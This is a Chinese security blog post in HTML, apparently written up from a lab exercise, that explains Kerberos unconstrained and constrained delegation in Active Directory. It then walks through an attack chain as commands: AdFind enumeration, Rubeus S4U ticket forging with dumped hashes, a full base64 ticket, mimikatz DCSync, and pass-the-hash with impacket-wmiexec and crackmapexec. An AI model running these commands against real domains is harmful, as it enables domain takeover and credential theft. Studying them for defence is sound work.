@@ -1,0 +1,105 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>域委派攻击 · Mini's blog</title><meta name="description" content="域委派主机账号与服务账号主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号
+服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如 SQLServer、MYSQL 等
+
+域用户通过注册 SPN (Service Principal Name)"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>域委派攻击</a></h3></div><div class="post-content"><h1 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h1><h3 id="主机账号与服务账号"><a href="#主机账号与服务账号" class="headerlink" title="主机账号与服务账号"></a>主机账号与服务账号</h3><p>主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号</p>
+<p>服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如 SQLServer、MYSQL 等</p>
+<blockquote>
+<p>域用户通过注册 SPN (Service Principal Name) 也能成为服务账号</p>
+</blockquote>
+<h3 id="域委派概念"><a href="#域委派概念" class="headerlink" title="域委派概念"></a>域委派概念</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
+<p>例如：当 A 访问服务 B 时，服务 B 拿着 A 用户的凭证去访问服务 C，这个过程称为委派</p>
+<p>在域中，只有主机账户或服务账户才有委派属性</p>
+<p>委派分为三种：非约束委派、约束委派和基于资源的委派</p>
+<h2 id="非约束委派（Unconstrained-Delegation）"><a href="#非约束委派（Unconstrained-Delegation）" class="headerlink" title="非约束委派（Unconstrained Delegation）"></a>非约束委派（Unconstrained Delegation）</h2><p>服务账号可以获取被委派用户的 TGT，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT， 模拟该用户访问任意服务。</p>
+<p>非约束委派的设置需要 <code>SeEnableDelegation</code> 特权，该特权通常仅授予域管理员</p>
+<p>配置了非约束性委派属性的<strong>机器账号</strong>的 <code>userAccountControl</code> 属性有个 <code>Flag</code> 位 <code>WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的值为 <code>0x81000=528384</code></p>
+<p>配置了非约束性委派属性的<strong>服务账号</strong>的 <code>userAccountControl</code> 属性有个 <code>Flag</code> 位 <code>NORMAL_ACCOUNT | TRUSTED_FOR_DELEGATION</code>，其对应的数值是 <code>0x80200=524800</code></p>
+<h3 id="非约束委派流程"><a href="#非约束委派流程" class="headerlink" title="非约束委派流程"></a>非约束委派流程</h3><p>user 想要请求 serverA，于是向 DC 发起认证，DC 会检查 serverA 的机器账号的属性，如果是非约束委派的话，会把用户的 TGT 放在 ST 票据中并一起发送给serverA，这样 serverA 在验证 ST 票据的同时也获取到了用户的 TGT，并把 TGT 储存在自己的 lsass 进程中以备下次重用，从而 serverA 就可以使用这个 TGT，来模拟这个 user 访问任何服务</p>
+<img src="/2025/02/17/Delegation-Attack/unconstrained-delegation.png" class="" title="Unconstrained Delegation">
+
+<blockquote>
+<p>默认域控配置了非约束性委派</p>
+</blockquote>
+<h2 id="约束委派（Constrained-Delegation）"><a href="#约束委派（Constrained-Delegation）" class="headerlink" title="约束委派（Constrained Delegation）"></a>约束委派（Constrained Delegation）</h2><p>由于非约束委派的不安全性（配置了非约束委派的机器在 LSASS 中缓存了用户的 TGT 票据可模拟用户去访问域中任意服务），微软在 windows server 2003 中引入了约束委派，对 Kerberos 协议进行了拓展，引入了 S4U，S4U 支持两个子协议：S4U2Self (Service for User to Self) 和 S4U2proxy (Service for Userto Proxy)，运行服务代表用户去向 KDC 请求票据</p>
+<ul>
+<li>S4U2Self 可以代表自身请求针对其自身的 Kerberos 服务票据 (ST)</li>
+<li>S4U2proxy 可以以用户的名义请求其它服务的 ST</li>
+</ul>
+<p>当服务账号或者主机被设置为约束性委派时，其 <code>userAccountControl</code> 属性包含 <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且 <code>msDS-AllowedToDelegateTo</code> 属性会包含被约束的服务</p>
+<h3 id="约束委派流程"><a href="#约束委派流程" class="headerlink" title="约束委派流程"></a>约束委派流程</h3><p>user 访问 serviceA，向 DC 发起 kerberos 认证，域控返回 user 的 TGT 和 ST1 票据，user 使用 ST1 票据对 serviceA 进行访问。如果配置了 serviceA 到 serviceB 的约束委派，则 serviceA 能使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 DC。域控返回 serviceA 一个用来访问 serviceB 的ST2票据,这样 serviceA 就能以用户的身份对 serviceB 发起访问</p>
+<img src="/2025/02/17/Delegation-Attack/constrained-delegation.png" class="" title="Constrained Delegation">
+
+<h1 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h1><h2 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h2><h3 id="查找域中配置非约束委派的主机-x2F-服务账户"><a href="#查找域中配置非约束委派的主机-x2F-服务账户" class="headerlink" title="查找域中配置非约束委派的主机&#x2F;服务账户"></a>查找域中配置非约束委派的主机&#x2F;服务账户</h3><h4 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h4><blockquote>
+<p>可在域外查询</p>
+</blockquote>
+<ul>
+<li><p>查询域内配置非约束性委派的主机</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询域内配置非约束性委派的服务账号</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -dn</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>对攻击者来说，如果使用 DC 或域管去访问 Service1，那么就会在 lsass 内存中留下票据，就相当于直接拿下了域控</p>
+<p><em>待。。</em></p>
+<h2 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h2><p>由于服务用户只能获取某个用户（或主机）的服务的 ST1 而非 TGT ， 所以只能模拟用户访问特定的服务 ，但是如果能拿到约束委派用户（或主机）的密码&#x2F;Hash，就可以模拟域内任意用户 (如 domain\administrator) 并代表其获得对已配置服务的访问权限（获取 TGS 票据）</p>
+<p>此外，我们不仅可以访问约束委派配置中用户可以模拟的服务， 还可以访问使用与模拟帐户权限允许的任何服务。（因为未检查 SPN，只检查权限）。比如，如果我们能够访问 CIFS 服务，那么同样有权限访问 HOST 服务。如果有权限访问到 DC 的 LDAP 服务，则有足够的权限去执行 DCSync</p>
+<h3 id="查找域中配置约束委派的主机-x2F-服务账户"><a href="#查找域中配置约束委派的主机-x2F-服务账户" class="headerlink" title="查找域中配置约束委派的主机 &#x2F; 服务账户"></a>查找域中配置约束委派的主机 &#x2F; 服务账户</h3><h4 id="AdFind-1"><a href="#AdFind-1" class="headerlink" title="AdFind"></a>AdFind</h4><blockquote>
+<p>可在域外查询</p>
+</blockquote>
+<ol>
+<li>普通域用户执行：</li>
+</ol>
+<ul>
+<li>查找域中配置约束委派的主机及服务<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></li>
+<li>查找域中配置约束委派的服务账户及服务<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li>域外可指定域普通用户账密进行查找：</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#AdFind.exe -h 域控IP -u 域普通用户名 -up &quot;密码&quot; -b &quot;DC=xx,DC=xx&quot; -f &quot;(&amp;(samAccountType=<span class="number">80530636</span>x)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查询域中配置约束委派的主机及服务<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>.<span class="number">2</span> -u redteam\user1 -up &quot;<span class="number">1</span>QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306369</span>)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></li>
+<li>查询域中配置约束委派的服务账户及服务<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>.<span class="number">2</span> -u redteam\user1 -up &quot;<span class="number">1</span>QAZ2wsx&quot; -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=<span class="number">805306368</span>)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="BloodHound-分析"><a href="#BloodHound-分析" class="headerlink" title="BloodHound 分析"></a>BloodHound 分析</h4><img src="/2025/02/17/Delegation-Attack/bloodhound-for-delegate.png" class="" title="Bloodhound">
+
+<p>上图可以看到 MSSQLSERVER 服务配置了到 DC 的约束性委派（LDAP 和 CIFS 服务）</p>
+<h3 id="Rubeus-利用-CIFS-服务"><a href="#Rubeus-利用-CIFS-服务" class="headerlink" title="Rubeus 利用 CIFS 服务"></a>Rubeus 利用 CIFS 服务</h3><p>第一步，通过 Rubeus 申请机器&#x2F;服务账户的 TGT</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> <code>rc4</code> 为 dump 下来的服务账户的 hash</p>
+</blockquote>
+<p>获取到 base64 格式的 TGT 后，伪造 Administrator 域管理员身份请求针对域控 CIFS 服务的 ST 票据，并将得到的票据传递到内存中</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>/ticket</code> 参数可以为 base64 格式的 TGT，或经过转化后的 .kirbi 文件</p>
+</blockquote>
+<p> .kirbi 文件可以通过 powershell 转化 base64 字符串得到</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">IO.File</span>]::WriteAllBytes(<span class="string">&quot;.\ticket.kirbi&quot;</span>, [<span class="type">Convert</span>]::FromBase64String(<span class="string">&quot;去掉换行后的base64&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>除上面步骤外，使用 Rubeus 也可以一步到位获取 CIFS 的 ST 票据：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:SqlServer$ /rc4:<span class="number">77</span>E3527E2A110B7E30659749718F54F9 /impersonateuser:administrator /msdsspn:cifs/dc.redteam.com /ptt</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>klist</code> 查看，成功申请到 CIFS 的票据</p>
+<img src="/2025/02/17/Delegation-Attack/cifs-st.png" class="" title="CIFS ST">
+
+<p>之后就可以访问域控的远程共享文件了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC.xiaorang.lab\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="Rebeus-利用-LDAP-服务"><a href="#Rebeus-利用-LDAP-服务" class="headerlink" title="Rebeus 利用 LDAP 服务"></a>Rebeus 利用 LDAP 服务</h3><p>第一步同理，利用服务账户的 Hash 申请 TGT</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:d9bd25dd6f02e2de2bef5b7ecc32d609 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 Administrator 域管理员身份请求针对域控 LDAP 服务的票据并注入内存</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE32+yacGkAGRudVKX6Lf0gKhjEaMMWmsMznRtO6S+b7JZjjs6xO/TurXVZ+<span class="number">57</span>qOoByxLnQK1Rs/qPJ6Zp5uNuVeYpJRNy/C6C9NbC06i1yr0DdvXvHWwSXmJMaCZgXNK6wTAphGJeiV2PeYigEc9con5C99wIz3UgAda9w7qazQE6Bt2riUc+Pp/aJqfXcdJhTXgY74oRfTYJicn5O0yOXbKFHiCo5tI1hCdPaGyCDDUASiGVwdVNYhTKUCpcA7tPwatcBkPcrjOLePfaznf6Y3WMy6jjRgeA+mlKAjiOzwVqp/V8NKRfdEKdgU5q/OZv7Sy4SDxEWs1lZ/LMlN5CXilDwRHUJfjrMY8xQ1HW2WjaXmlnzMXD5K/<span class="number">8</span>XDj2Wn9caKtTFPbGd1oyiLBv2QUYie6wFEhrhVH9Udo25/bN9GCTNtxS3STH6hE+<span class="number">09</span>upxtKwZ/xCu2ug9UoOxSCsn8yqWJwUwHrX6ax1Didg04ziA8iFkCYDrgELdJfCrpCzQz1bWs30oGAKh2pmVVpYhzgBfv3a0+yiyt97fIFAcd5gNiLn0/OTe5tJ3Lj32iNbbKQHrkHxq+<span class="number">54</span>mDckWMKXRYwK18eMNUoR58mQlAPqa4BMbilxwWZA5qPG1R51/BJgOTvWUIkj5JDkZpGotOLBkRHoH8JZe4YfxurpyaZKYlmk3sTnre8deDsAOItf90yLdXVY24XBrxA25/Mgwu/utYGp/<span class="number">6</span>ADmYkZGPr+<span class="number">8</span>l4gySoDpg0VNZIULI/E2NqNQYDBABexvcXTVAcbURq3q9rHyPaJGEQbJDGXE5PBt8wlQXW9sZRUPurxE24ZcLxgFIp6UFgmVaJaDTdj/IiFqa9M8T/MJMqpWTivlOXn6abvgmIvgCab2MOmpIkpc6Xcq59879VMsdDghvHpUYp5Z+EWMsmrOLQCSWAFZxMgVN0UA9tLbbTJRWiZvYNpEZ4J0sV/c6OSAcFtfr/Kno5wNbGTfELb/QZNKeEVk+MPT3LG28vJFCVnyyrzh6X9rJ5P2Sr58xFw4mdSuyd4dS3hWNEFB7SlN+R0vO1pK8hF4XnJZn/ExnZSLg0Tr087uFTmqQTMnu7g6ys85SBSnf6ExtQxo4d+arvMZChV3SpYZGgJPHxAmYPrpm+oxa5FohEXeQaXSHy6hKiMGqO+LKSQO253dJ90b9EQ5p+wH2/<span class="number">7</span>L26BHFH8Bat1JCW5Q1Mt/JaRdIp0Tv//F+<span class="number">2</span>Kr2vlC92I5lNnBRxqZXVfuqGQUa4bclQeZleqdGhCrq4gFOavlmzAK/<span class="number">0</span>dA5Tl75cpkIHWWSJURG//v708FV1yc314FZ54deVTTfvQWcmwssoS+DHqdhdBsU09SP3oBSViSMz+y+/AQGPw12gYGvwHVyA7m8C1Jm2EjiMBxlc2ieOj3RzeI1lo2f1vfWk/<span class="number">8</span>DAABcaAo3uk9KbcQlYinxii6aqtoluXWfZaFbs6+D/M9Bop3epNA6hi2n8lKjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBAz2hwi+O3FNVL4HiirLZoSoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMTAxMzEwMzYyM1qmERgPMjAyMzEwMTMyMDM2MjNapxEYDzIwMjMxMDIwMTAzNjIzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure>
+
+<p><code>klist</code> 查看成功申请的 LDAP 服务票据</p>
+<p>LDAP 服务具有 <strong>DCSync</strong> 权限，因此可以使用 mimikatz dump 下来 Administrator 域管的 hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>得到域管的 hash 后，可以登陆域控，这里使用 WMI 服务进行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :<span class="number">1</span>a19251fbd935969832616366ae3fe62 Administrator@<span class="number">172</span>.<span class="number">22</span>.<span class="number">2</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以进行 PTH 攻击</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb <span class="number">172</span>.<span class="number">22</span>.<span class="number">2</span>.<span class="number">3</span> -u administrator -H <span class="number">1</span>a19251fbd935969832616366ae3fe62 -d xiaorang.lab -x &quot;<span class="built_in">type</span> c:\Users\Administrator\flag\flag04.txt&quot;</span><br></pre></td></tr></table></figure></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2025-02-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/intranet/" title="intranet">intranet </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2025/02/17/Delegation-Attack/,Mini's blog,域委派攻击,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2025/02/16/mimikatz/" title="mimikatz">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
